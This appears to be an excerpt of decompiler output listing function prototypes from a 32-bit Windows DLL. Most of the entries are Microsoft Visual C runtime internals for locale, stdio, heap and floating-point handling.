    "int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_15ade71b0218206bbe3333a0c9b79046_,_lambda_da44e0f8b0f19ba52fefafb335991732_ &,_lambda_207f2d024fc103971653565357d6cd41_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_38edbb1296d33220d7e4dd0ed76b244a_,_lambda_5ce1d447e08cb34b2473517608e21441_ &,_lambda_fb385d3da700c9147fc39e65dd577a8c_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_6affb1475c98b40b75cdec977db92e3c_,_lambda_b8d4b9c228a6ecc3f80208dbb4b4a104_ &,_lambda_608742c3c92a14382c1684fc64f96c88_>(",
    "        _DWORD *a1,",
    "        struct __acrt_ptd *const **a2,",
    "        _DWORD *a3);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_a7e850c220f1c8d1e6efeecdedd162c6_,_lambda_46720907175c18b6c9d2717bc0d2d362_ &,_lambda_9048902d66e8d99359bc9897bbb930a8_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "void __cdecl construct_ptd(struct __acrt_ptd *const a1, struct __crt_locale_data **const a2);",
    "void __stdcall destroy_fls(struct __acrt_ptd *Block);",
    "void __cdecl destroy_ptd(void **a1);",
    "struct __acrt_ptd *sub_1001FE75();",
    "void __cdecl replace_current_thread_locale_nolock(struct __acrt_ptd *const a1, struct __crt_locale_data *const a2);",
    "void sub_1001FF68();",
    "int sub_1001FFAC();",
    "struct __acrt_ptd *sub_1001FFBA();",
    "struct __acrt_ptd *sub_1001FFFD();",
    "char *__cdecl sub_10020089(int a1, int a2);",
    "char sub_100200D2();",
    "char __acrt_uninitialize_ptd();",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_e5124f882df8998aaf41531e079ba474_,_lambda_3e16ef9562a7dcce91392c22ab16ea36_ &,_lambda_e25ca0880e6ef98be67edffd8c599615_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "__int32 sub_10020190();",
    "int __acrt_uninitialize_locale();",
    "struct __crt_locale_data *__cdecl sub_100201C2(int a1, struct __crt_locale_data **a2);",
    "int __cdecl sub_100201EF(int a1, int *a2, int a3);",
    "struct __crt_multibyte_data *__cdecl sub_10020220(int a1, struct __crt_multibyte_data **a2);",
    "int __cdecl sub_1002024D(int a1, int *a2, int a3);",
    "void __cdecl _free_base(void *Block);",
    "HANDLE sub_100202C0();",
    "LPVOID __cdecl sub_100202D0(unsigned int a1);",
    "_BYTE *__cdecl sub_10020321(__m128i *a1, unsigned int a2);",
    "int __cdecl sub_10020456(char *a1, unsigned int a2);",
    "int __cdecl __acrt_fp_classify(int *a1);",
    "char __cdecl fe_to_nearest(const double *a1, unsigned __int64 a2, __int16 a3);",
    "int __cdecl sub_10020720(",
    "        _DWORD *a1,",
    "        char *Str,",
    "        rsize_t a3,",
    "        int a4,",
    "        rsize_t a5,",
    "        signed int Size,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10);",
    "int __cdecl sub_10020A5C(",
    "        __int64 *a1,",
    "        char *a2,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10);",
    "int __cdecl sub_10020AEC(",
    "        char *a1,",
    "        rsize_t SizeInBytes,",
    "        int a3,",
    "        char a4,",
    "        int a5,",
    "        int a6,",
    "        unsigned __int8 a7,",
    "        __crt_cached_ptd_host *a8);",
    "int __cdecl sub_10020C2F(",
    "        __int64 *a1,",
    "        char *Src,",
    "        unsigned int a3,",
    "        int a4,",
    "        rsize_t SizeInBytes,",
    "        size_t Size,",
    "        int a7,",
    "        __crt_cached_ptd_host *a8);",
    "int __cdecl sub_10020CB8(char *Src, unsigned int a2, signed int Size, int a4, char a5, __crt_cached_ptd_host *a6);",
    "int __cdecl sub_10020D98(",
    "        __int64 *a1,",
    "        char *Src,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        signed int Size,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __crt_cached_ptd_host *a10);",
    "errno_t __cdecl fp_format_nan_or_infinity(",
    "        int a1,",
    "        unsigned __int8 a2,",
    "        char *Destination,",
    "        rsize_t SizeInBytes,",
    "        unsigned __int8 a5);",
    "void __cdecl shift_bytes(char *const a1, unsigned int a2, char *const Src, int a4);",
    "char __cdecl should_round_up(double *a1, unsigned __int64 a2, __int16 a3, int a4);",
    "errno_t __cdecl __acrt_fp_format(",
    "        int *a1,",
    "        char *Str,",
    "        rsize_t SizeInBytes,",
    "        int a4,",
    "        rsize_t a5,",
    "        int a6,",
    "        size_t Size,",
    "        char a8,",
    "        int a9,",
    "        int a10,",
    "        __crt_cached_ptd_host *a11);",
    "int __cdecl sub_1002113B(int *a1, LPSTR lpMultiByteStr, size_t Size, WCHAR WideCharStr, __crt_cached_ptd_host *a5);",
    "int __cdecl sub_1002129F(LPWSTR lpWideCharStr, CHAR *lpMultiByteStr, char *a3, struct _Mbstatet *a4);",
    "int __cdecl sub_100213CF(char *a1);",
    "unsigned int __cdecl sub_10021410(unsigned int *a1, char *a2, int a3, __crt_mbstring *a4, struct _Mbstatet *a5);",
    "int __usercall sub_100215C9@<eax>(",
    "        struct __crt_cached_ptd_host *a1@<edi>,",
    "        struct _Mbstatet *a2,",
    "        unsigned __int16 a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5);",
    "int __stdcall _lambda_0f007d4f94c691a9a85cf1869a09f0c3_::operator()(_BYTE *a1);",
    "unsigned int __cdecl __crt_mbstring::__mbrtowc_utf8(",
    "        __crt_mbstring *this,",
    "        wchar_t *a2,",
    "        const char *a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5);",
    "unsigned int __cdecl __crt_mbstring::__mbsrtowcs_utf8(",
    "        __crt_mbstring *this,",
    "        wchar_t *a2,",
    "        const char **a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5);",
    "int __cdecl _fileno(FILE *Stream);",
    "int __cdecl _get_printf_count_output();",
    "void sub_10021832();",
    "void __cdecl initialize_stdio_handles_nolock();",
    "char __acrt_initialize_lowio();",
    "char sub_100219F2();",
    "unsigned int __cdecl filter_mbtowcs_flags(unsigned int a1, unsigned int a2);",
    "int __cdecl __acrt_MultiByteToWideChar(",
    "        UINT CodePage,",
    "        unsigned int a2,",
    "        LPCCH lpMultiByteStr,",
    "        int cbMultiByte,",
    "        LPWSTR lpWideCharStr,",
    "        int cchWideChar);",
    "int sub_10021AE0();",
    "int sub_10021B0A();",
    "int sub_10021B35();",
    "int sub_10021B60();",
    "FARPROC __cdecl sub_10021B8B(int a1, LPCSTR lpProcName, _DWORD *a3, _DWORD *a4);",
    "HINSTANCE __cdecl try_load_library_from_system_directory(LPCWSTR lpLibFileName);",
    "int __stdcall sub_10021CBB(int a1);",
    "int __stdcall __acrt_AreFileApisANSI();",
    "int __stdcall sub_10021D29(",
    "        wchar_t *a1,",
    "        DWORD dwCmpFlags,",
    "        PCNZWCH lpString1,",
    "        int cchCount1,",
    "        PCNZWCH lpString2,",
    "        int cchCount2,",
    "        int a7,",
    "        int a8,",
    "        int a9);",
    "DWORD __stdcall sub_10021D86(void (__stdcall *a1)(PVOID lpFlsData));",
    "BOOL __stdcall sub_10021D92(DWORD a1);",
    "int sub_10021D9E();",
    "PVOID __stdcall sub_10021DAB(DWORD a1);",
    "BOOL __stdcall sub_10021DB7(DWORD a1, void *a2);",
    "BOOL __stdcall sub_10021DC3(struct _RTL_CRITICAL_SECTION *a1, DWORD a2, DWORD a3);",
    "int __stdcall sub_10021DCF(",
    "        wchar_t *a1,",
    "        DWORD dwMapFlags,",
    "        LPCWSTR lpSrcStr,",
    "        int cchSrc,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        int a7,",
    "        int a8,",
    "        int a9);",
    "int __stdcall __acrt_LocaleNameToLCID(wchar_t *a1, int a2);",
    "bool __thiscall sub_10021E5D(void *this);",
    "bool sub_10021E80();",
    "int __cdecl __acrt_uninitialize_winapi_thunks(char a1);",
    "char __cdecl __vcrt_uninitialize_winapi_thunks(char a1);",
    "int __cdecl _wmkdir(const wchar_t *Path);",
    "_DWORD *__cdecl __acrt_stdio_allocate_stream(_DWORD *a1);",
    "int __cdecl __acrt_stdio_free_stream(int a1);",
    "FILE **__cdecl find_or_allocate_unused_stream_nolock(FILE **a1);",
    "struct __acrt_stdio_stream_mode *__cdecl sub_10022077(struct __acrt_stdio_stream_mode *a1, _BYTE *a2);",
    "int __cdecl sub_100222B8(char *FileName, _BYTE *a2, int ShareFlag, int a4);",
    "char __cdecl __acrt_stdio_parse_mode_D(struct __acrt_stdio_stream_mode *a1);",
    "char __cdecl __acrt_stdio_parse_mode_T(struct __acrt_stdio_stream_mode *a1);",
    "char __cdecl __acrt_stdio_parse_mode_b(struct __acrt_stdio_stream_mode *a1);",
    "bool __cdecl __acrt_stdio_parse_mode_c(struct __acrt_stdio_stream_mode *a1, bool *a2);",
    "bool __cdecl __acrt_stdio_parse_mode_n(struct __acrt_stdio_stream_mode *a1, bool *a2);",
    "bool __cdecl __acrt_stdio_parse_mode_plus(struct __acrt_stdio_stream_mode *a1, bool *a2);",
    "char __cdecl __acrt_stdio_parse_mode_t(struct __acrt_stdio_stream_mode *a1);",
    "char __cdecl __acrt_stdio_parse_mode_x(struct __acrt_stdio_stream_mode *a1);",
    "int __cdecl sub_1002244F(char *FileName, _BYTE *a2, int ShareFlag, int a4);",
    "int __cdecl common_lseek<__int64>(",
    "        int FileHandle,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        DWORD dwMoveMethod,",
    "        __crt_cached_ptd_host *a4);",
    "DWORD __cdecl common_lseek_nolock<__int64>(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod, int a4);",
    "int __cdecl _lseeki64_internal(",
    "        int FileHandle,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        DWORD dwMoveMethod,",
    "        __crt_cached_ptd_host *a4);",
    "DWORD __cdecl _lseeki64_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod);",
    "DWORD __cdecl _lseeki64_nolock_internal(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod, int a4);",
    "void __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_2866be3712abc81a800a822484c830d8_,_lambda_39ca0ed439415581b5b15c265174cece_ &,_lambda_2b24c74d71094a6cd0cb82e44167d71b_>(",
    "        FILE **a1,",
    "        FILE ***a2,",
    "        FILE **a3);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_2cc53f568c5a2bb6f192f930a45d44ea_,_lambda_ab61a845afdef5b7c387490eaf3616ee_ &,_lambda_c2ffc0b7726aa6be21d5f0026187e748_>(",
    "        _DWORD *a1,",
    "        FILE ***a2,",
    "        _DWORD *a3);",
    "int __cdecl sub_100227B6(char a1);",
    "char __cdecl common_flush_all_should_try_to_flush_stream(int a1, _DWORD *a2);",
    "bool __cdecl is_stream_flushable_or_commitable(__int16 a1);",
    "int __cdecl __acrt_stdio_flush_nolock(FILE *Stream, __crt_cached_ptd_host *a2);",
    "int __cdecl _fflush_nolock(FILE *Stream);",
    "int sub_10022924();",
    "int __cdecl sub_1002292D(int FileHandle, char *a2, int a3);",
    "unsigned int __cdecl sub_10022A80(int FileHandle, __int16 *a2, int a3);",
    "int __cdecl translate_ansi_or_utf8_nolock(",
    "        int FileHandle,",
    "        char *lpMultiByteStr,",
    "        unsigned int a3,",
    "        LPWSTR lpWideCharStr,",
    "        unsigned int cchWideChar);",
    "unsigned int __cdecl sub_10022D97(int a1, char *a2, int a3);",
    "int __cdecl _read(int FileHandle, void *DstBuf, unsigned int MaxCharCount);",
    "unsigned int __cdecl sub_10022F2D(unsigned int FileHandle, LPWSTR lpWideCharStr, DWORD nNumberOfBytesToRead);",
    "int __cdecl sub_100232B9(FILE *Stream);",
    "int __cdecl sub_10023444(FILE *a1);",
    "int __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_d422a76eb4c3bf3ad751449ab71a6ea4_,_lambda_c9ba49e555ba839a7b07aa3fbecb7617_ &,_lambda_9476263c8ee91a25d21c55370bdb50de_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "int __cdecl sub_100234E0(int a1, __crt_cached_ptd_host *a2);",
    "int __cdecl _close_nolock(int FileHandle);",
    "int __cdecl _close_nolock_internal(int FileHandle, int a2);",
    "int __cdecl __acrt_stdio_free_buffer_nolock(int a1);",
    "int __cdecl _strnicoll(const char *String1, const char *String2, size_t MaxCount);",
    "int __cdecl _strnicoll_l(const char *String1, const char *String2, size_t MaxCount, _locale_t Locale);",
    "char sub_10023784();",
    "void __cdecl __acrt_lock(int a1);",
    "char __acrt_uninitialize_locks();",
    "void __cdecl __acrt_unlock(int a1);",
    "int __cdecl iswctype(wint_t C, wctype_t Type);",
    "int __acrt_initialize_timeset();",
    "unsigned int __cdecl filter_wcstomb_flags(unsigned int a1, unsigned int a2);",
    "int __cdecl sub_10023952(",
    "        unsigned int a1,",
    "        unsigned int a2,",
    "        LPCWCH lpWideCharStr,",
    "        int cchWideChar,",
    "        LPSTR lpMultiByteStr,",
    "        int cbMultiByte,",
    "        const CHAR *a7,",
    "        BOOL *a8);",
    "void __cdecl _freea_crt(int a1);",
    "int __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_cbab9ec6f41b0180b23cc171c22676b0_,_lambda_44731a7d0e6d81c3e6aa82d741081786_ &,_lambda_4b292cb8dd18144e164572427af410ab_>(",
    "        int *a1,",
    "        int a2,",
    "        int *a3);",
    "void (__cdecl **__cdecl get_global_action_nolock(int a1))(int);",
    "struct __crt_signal_action_t *__cdecl siglookup(int a1, struct __crt_signal_action_t *const a2);",
    "int __acrt_get_sigabrt_handler();",
    "int __cdecl __acrt_initialize_signal_handlers(int a1);",
    "int __cdecl raise(int Signal);",
    "LPVOID __cdecl sub_10023CF0(unsigned int a1, unsigned int a2);",
    "int __cdecl _fcloseall();",
    "char __acrt_app_verifier_enabled();",
    "unsigned int __acrt_is_secure_process();",
    "BOOL __acrt_get_process_end_policy();",
    "// Microsoft VisualC universal runtime",
    "int __cdecl unknown_libname_27(unsigned int a1, unsigned int a2);",
    "int __cdecl sub_10023E5F(LPCWCH lpWideCharStr, int a2, int a3, unsigned int a4);",
    "int __cdecl common_expand_argv_wildcards<char>(unsigned __int8 **a1, int *a2);",
    "int __cdecl copy_and_add_argument_to_buffer<char>(const char *a1, int a2, int a3, int a4);",
    "int __cdecl sub_10024153(unsigned __int8 *Start, unsigned __int8 *Pos, _DWORD *a3);",
    "// Microsoft VisualC universal runtime",
    "void __thiscall unknown_libname_28(void ***this);",
    "int __thiscall sub_10024404(int this, int a2);",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_29(LPVOID *this);",
    "int __cdecl __acrt_expand_narrow_argv_wildcards(unsigned __int8 **a1, int *a2);",
    "int __cdecl __acrt_GetModuleFileNameA(HMODULE hModule, int a2, int a3);",
    "void __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_4fdada1b837b2abbf20876fac97688ad_,_lambda_b57350f2640456a0859d250846f69caf_ &,_lambda_eed5e4f92b5b7d55fa22c48c484aaa54_>(",
    "        int *a1,",
    "        int a2,",
    "        int *a3);",
    "// Microsoft VisualC universal runtime",
    "volatile signed __int32 *__thiscall unknown_libname_30(volatile signed __int32 ****this);",
    "const wchar_t *__cdecl CPtoLocaleName(int a1);",
    "UINT __cdecl getSystemCP(UINT a1);",
    "void __cdecl setSBCS(struct __crt_multibyte_data *a1);",
    "void __cdecl setSBUpLow(struct __crt_multibyte_data *a1);",
    "// bad sp value at call has been detected, the output may be wrong!",
    "int __usercall setmbcp_internal@<eax>(",
    "        void *a1@<ebp>,",
    "        UINT a2,",
    "        bool a3,",
    "        struct __acrt_ptd *const a4,",
    "        struct __crt_multibyte_data **const a5);",
    "struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(",
    "        struct __acrt_ptd *const a1,",
    "        struct __crt_multibyte_data **const a2);",
    "char __usercall __acrt_initialize_multibyte@<al>(void *a1@<ebp>);",
    "struct __crt_multibyte_data *sub_10024B37();",
    "int __cdecl _setmbcp_nolock(UINT a1, struct __crt_multibyte_data *a2);",
    "BOOL __cdecl x_ismbbtype_l(struct __crt_locale_pointers *a1, unsigned __int8 a2, int a3, unsigned __int8 a4);",
    "int __cdecl _ismbblead(unsigned int Ch);",
    "char __acrt_initialize_command_line();",
    "const wchar_t *__cdecl find_end_of_double_null_terminated_sequence(const wchar_t *a1);",
    "const wchar_t *__dcrt_get_narrow_environment_from_os();",
    "int __cdecl common_set_variable_in_environment_nolock<char>(char *Str, int a2);",
    "_BYTE *__cdecl copy_environment<char>(const char **a1);",
    "_BYTE *sub_100251B5();",
    "int __cdecl find_in_environment_nolock<char>(char *String1, size_t MaxCount);",
    "int __cdecl __dcrt_set_variable_in_narrow_environment_nolock(char *a1, int a2);",
    "void *__cdecl _recalloc_base(void *Block, size_t Count, size_t Size);",
    "void *__cdecl _recalloc(void *Block, size_t Count, size_t Size);",
    "HANDLE sub_100252C0();",
    "bool __acrt_initialize_heap();",
    "char sub_100252F0();",
    "HANDLE sub_10025300();",
    "char __cdecl __acrt_execute_initializers(_DWORD *a1, _DWORD *a2);",
    "char __cdecl __acrt_execute_uninitializers(int a1, int a2);",
    "bool __acrt_has_user_matherr();",
    "int __cdecl sub_100253C0(int a1);",
    "int __cdecl sub_100253D0(int a1);",
    "int __cdecl __acrt_add_locale_ref(int a1);",
    "void __cdecl sub_10025486(char *Block);",
    "signed __int32 __cdecl __acrt_locale_add_lc_time_reference(int a1);",
    "void __cdecl __acrt_locale_free_lc_time_if_unreferenced(void **Block);",
    "signed __int32 __cdecl __acrt_locale_release_lc_time_reference(int a1);",
    "signed __int32 __cdecl __acrt_release_locale_ref(signed __int32 a1);",
    "int __acrt_update_thread_locale_data();",
    "int __cdecl _updatetlocinfoEx_nolock(signed __int32 *a1, int a2);",
    "void __cdecl __acrt_locale_free_monetary(void **a1);",
    "void __cdecl __acrt_locale_free_numeric(void **a1);",
    "void __cdecl free_crt_array_internal(void **a1, unsigned int a2);",
    "void __cdecl __acrt_locale_free_time(void **a1);",
    "BOOL __cdecl sub_10025A13(",
    "        struct __crt_locale_pointers *a1,",
    "        DWORD dwInfoType,",
    "        LPCCH lpMultiByteStr,",
    "        int cbMultiByte,",
    "        LPWORD lpCharType,",
    "        UINT CodePage,",
    "        int a7);",
    "int sub_10025B20();",
    "int __cdecl _set_new_mode(int NewMode);",
    "bool __cdecl check_trailing(_BYTE *a1, int a2);",
    "bool __cdecl should_round_up(int a1, char *a2, int a3, int a4, int a5);",
    "int __cdecl __acrt_fp_strflt_to_string(",
    "        char *a1,",
    "        unsigned int a2,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        int a6,",
    "        __crt_cached_ptd_host *a7);",
    "int __cdecl sub_10025D10(int *a1, unsigned int *a2);",
    "int __cdecl sub_100261E7(__int64 a1, int a2, int a3, int *a4, char *a5, rsize_t SizeInBytes);",
    "int sub_100276C0();",
    "unsigned int __usercall sub_100276CF@<eax>(",
    "        struct __crt_cached_ptd_host *a1@<esi>,",
    "        _BYTE *a2,",
    "        unsigned int a3,",
    "        __crt_mbstring *a4,",
    "        struct _Mbstatet *a5);",
    "__crt_mbstring *__cdecl __crt_mbstring::reset_and_return(__crt_mbstring *this, _DWORD *a2);",
    "unsigned int __cdecl __crt_mbstring::return_illegal_sequence(__crt_mbstring *this, struct _Mbstatet *a2);",
    "int __cdecl _isatty(int FileHandle);",
    "char *__acrt_lowio_create_handle_array();",
    "void __cdecl __acrt_lowio_destroy_handle_array(LPCRITICAL_SECTION lpCriticalSection);",
    "int __cdecl __acrt_lowio_ensure_fh_exists(unsigned int a1);",
    "void __cdecl __acrt_lowio_lock_fh(int a1);",
    "int __cdecl __acrt_lowio_set_os_handle(unsigned int a1, struct _RTL_CRITICAL_SECTION_DEBUG *hHandle);",
    "void __cdecl __acrt_lowio_unlock_fh(int a1);",
    "int _alloc_osfhnd();",
    "int __cdecl _free_osfhnd(unsigned int a1);",
    "intptr_t __cdecl _get_osfhandle(int FileHandle);",
    "int __cdecl GetTableIndexFromLocaleName(const wchar_t *a1);",
    "int __cdecl __acrt_DownlevelLocaleNameToLCID(wchar_t *a1);",
    "int __cdecl sub_10027CBD(unsigned __int16 *a1, unsigned __int16 *a2, int a3);",
    "int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);",
    "int __cdecl _strnicmp_l(const char *String1, const char *String2, size_t MaxCount, _locale_t Locale);",
    "int __cdecl common_sopen_dispatch<char>(LPCCH lpMultiByteStr, int a2, int a3, int a4, int *a5, int a6);",
    "int __cdecl configure_text_mode(int FileHandle, char a2, int a3, int a4, int a5, int a6, int a7, int a8, _BYTE *a9);",
    "HANDLE __cdecl create_file(",
    "        const WCHAR *lpFileName,",
    "        struct _SECURITY_ATTRIBUTES *lpSecurityAttributes,",
    "        int a3,",
    "        DWORD dwDesiredAccess,",
    "        DWORD dwCreationDisposition,",
    "        DWORD dwShareMode,",
    "        int a7,",
    "        int a8);",
    "unsigned int __cdecl decode_open_create_flags(__int16 a1);",
    "int __cdecl sub_1002820F(int a1, int a2, int a3, char a4);",
    "int __cdecl truncate_ctrl_z_if_present(int FileHandle);",
    "int __cdecl _sopen_nolock(int a1, int a2, LPCCH lpMultiByteStr, int a4, int a5, int a6);",
    "errno_t __cdecl _sopen_s(int *FileHandle, const char *FileName, int OpenFlag, int ShareFlag, int PermissionMode);",
    "int __cdecl _wsopen_nolock(_DWORD *a1, int *a2, const WCHAR *a3, unsigned int a4, int a5, char a6);",
    "int __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9e9de3de5fa147e2223d7db92bc10aa6_,_lambda_38ce7e780aa69e748d6df282ebc68efe_ &,_lambda_8ca6da459f0f6780f1cff60fdc3d00e5_>(",
    "        int *a1,",
    "        int **a2,",
    "        int *a3);",
    "int __cdecl _commit(int FileHandle);",
    "DWORD *__cdecl sub_1002890A(DWORD *a1, int a2, void *a3, int a4, struct _Mbstatet *a5);",
    "DWORD *__cdecl write_double_translated_unicode_nolock(DWORD *a1, unsigned int a2, int a3);",
    "bool __cdecl write_requires_double_translation_nolock(int FileHandle, struct __crt_cached_ptd_host *a2);",
    "DWORD *__cdecl write_text_ansi_nolock(DWORD *a1, int a2, unsigned int a3, int a4);",
    "DWORD *__cdecl write_text_utf16le_nolock(DWORD *a1, int a2, unsigned __int16 *a3, int a4);",
    "DWORD *__cdecl write_text_utf8_nolock(DWORD *a1, int a2, unsigned int a3, int a4);",
    "int __cdecl _write(int FileHandle, const void *Buf, unsigned int MaxCharCount);",
    "int __cdecl _write_internal(int FileHandle, int a2, int a3, __crt_cached_ptd_host *a4);",
    "int __cdecl _write_nolock(int FileHandle, const void *a2, DWORD a3, __crt_cached_ptd_host *a4);",
    "int __cdecl __acrt_stdio_allocate_buffer_nolock(_DWORD *a1);",
    "int __cdecl InternalCompareStringA(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwCmpFlags,",
    "        char *String,",
    "        int Count,",
    "        const char *a6,",
    "        int a7,",
    "        UINT CodePage);",
    "int __cdecl __acrt_CompareStringA(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwCmpFlags,",
    "        char *String,",
    "        size_t Count,",
    "        char *a6,",
    "        size_t a7,",
    "        UINT CodePage);",
    "BOOL __cdecl __acrt_GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType);",
    "void __cdecl sub_10029770(char *a1, unsigned int a2, int a3, int (__cdecl *a4)(char *, char *));",
    "int __cdecl sub_10029BAC(_BYTE *a1, int a2, int a3, int a4);",
    "int __cdecl sub_10029C77(_BYTE *a1, int a2, int a3, int a4);",
    "char *__cdecl strpbrk(const char *Str, const char *Control);",
    "unsigned __int8 *__cdecl _mbsdec(const unsigned __int8 *Start, const unsigned __int8 *Pos);",
    "unsigned __int8 *__cdecl _mbsdec_l(const unsigned __int8 *Start, const unsigned __int8 *Pos, _locale_t Locale);",
    "int __cdecl __acrt_LCMapStringA_stat(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwMapFlags,",
    "        char *String,",
    "        int Count,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        UINT CodePage,",
    "        int a9);",
    "int __cdecl sub_10029F61(",
    "        struct __crt_locale_pointers *a1,",
    "        wchar_t *a2,",
    "        DWORD dwMapFlags,",
    "        char *String,",
    "        size_t Count,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        UINT CodePage,",
    "        int a9);",
    "int __usercall sub_10029FAA@<eax>(void *a1@<ebp>);",
    "BOOL __cdecl __acrt_SetEnvironmentVariableA(LPCCH lpMultiByteStr, LPCCH a2);",
    "size_t __cdecl _msize(void *Block);",
    "size_t __cdecl sub_1002A090(void *Block);",
    "void *__cdecl _realloc_base(void *Block, size_t Size);",
    "int __cdecl sub_1002A110(_DWORD *a1, int a2, int a3);",
    "int __cdecl fegetenv(fenv_t *Env);",
    "BOOL __cdecl sub_1002A1A0(_DWORD *a1);",
    "int __cdecl sub_1002A200(unsigned int *a1);",
    "__m128d __usercall _libm_sse2_log10_precise@<xmm0>(__m128d result@<xmm0>);",
    "double __usercall sub_1002A550@<st0>(__m128i a1@<xmm0>, const __m128i a2);",
    "unsigned int __cdecl sub_1002A647(unsigned int a1);",
    "unsigned int __cdecl sub_1002A6FD(unsigned int a1);",
    "int __cdecl sub_1002A7AC(unsigned int a1);",
    "unsigned int __cdecl sub_1002A866(unsigned int a1);",
    "int __cdecl sub_1002A91F(unsigned int a1);",
    "unsigned int __acrt_fenv_get_control();",
    "int __usercall __acrt_fenv_get_status@<eax>(unsigned __int16 a1@<fpstat>);",
    "int __cdecl __acrt_fenv_set_control(unsigned int a1);",
    "unsigned int __cdecl __acrt_fenv_set_status(int a1);",
    "int sub_1002ABE3();",
    "int __cdecl __ascii_strnicmp(unsigned __int8 *a1, unsigned __int8 *a2, int a3);",
    "errno_t __cdecl _get_fmode(int *PMode);",
    "int __cdecl sub_1002AC7E(int a1, int a2);",
    "__crt_seek_guard *__thiscall __crt_seek_guard::__crt_seek_guard(__crt_seek_guard *this, int FileHandle, __int64 a3);",
    "int __cdecl _chsize_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove);",
    "int __cdecl _chsize_nolock_internal(int FileHandle, LARGE_INTEGER liDistanceToMove, __crt_cached_ptd_host *a3);",
    "wint_t __cdecl _putwch_nolock(wchar_t Character);",
    "size_t __cdecl __strncnt(const char *String, size_t Count);",
    "int __cdecl sub_1002AFB8(int a1);",
    "int __usercall sub_1002B074@<eax>(char a1@<fpstat>);",
    "int __cdecl sub_1002B18A(int a1, int a2);",
    "int __cdecl sub_1002B4DA(unsigned int a1);",
    "_DWORD *__cdecl __libm_error_support(__int64 *a1, __int64 *a2, __int64 *a3, int a4);",
    "double __usercall _CIlog10@<st0>(double x@<st0>);",
    "int __acrt_initialize_sse2();",
    "double __usercall sub_1002B910@<st0>(double result@<st0>, double a2);",
    "int __acrt_initialize_fmode();",
    "void __cdecl __dcrt_lowio_initialize_console_output();",
    "BOOL sub_1002BA1A();",
    "// Microsoft VisualC universal runtime",
    "HANDLE unknown_libname_31();",
    "// Microsoft VisualC universal runtime",
    "BOOL __cdecl unknown_libname_32(void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten);",
    "unsigned int __cdecl __set_fpsr_sse2(unsigned int a1);",
    "int __usercall _clrfp@<eax>(__int16 a1@<fpstat>);",
    "int sub_1002BB36();",
    "void _set_statfp();",
    "int __usercall _statfp@<eax>(__int16 a1@<fpstat>);",
    "int __usercall _CIlog10_pentium4@<eax>(__int64 a1@<st0>);",
    "double __usercall start_0@<st0>(__m128d a1@<xmm0>, double a2);",
    "void __usercall sub_1002BE54(char a1@<ch>, int a2@<ebp>);",
    "void zerotoxdone();",
    "void expbigret();",
    "double __fastcall _rtforexpinf(char a1);",
    "// positive sp value has been detected, the output may be wrong!",
    "void __usercall _ffexpm1(int a1@<ebp>, long double a2@<st0>);",
    "int __usercall isintTOS@<eax>(double a1@<st0>);",
    "void isintTOSret();",
    "void notanint();",
    "void evenint();",
    "double __usercall usepowhlp@<st0>(int a1@<ebp>, double a2@<st1>, __int64 a3@<st0>);",
    "double __usercall _twoToTOS@<st0>(double a1@<st0>);",
    "double __usercall _convertTOStoQNaN@<st0>(int a1@<eax>, double result@<st0>);",
    "double __fastcall _fload_withFB(int a1, _DWORD *a2);",
    "int __cdecl _checkTOS_withFB(int a1, int a2);",
    "void _startTwoArgErrorHandling();",
    "double __usercall _startOneArgErrorHandling@<st0>(",
    "        int a1@<eax>,",
    "        int a2@<edx>,",
    "        int a3@<ecx>,",
    "        double a4@<st0>,",
    "        __int16 a5,",
    "        int a6,",
    "        int a7,",
    "        int a8);",
    "double __cdecl _frnd(double a1);",
    "double __usercall sub_1002C4D0@<st0>(int a1@<ebp>, int a2, int a3, int a4, int a5, double a6, int a7);",
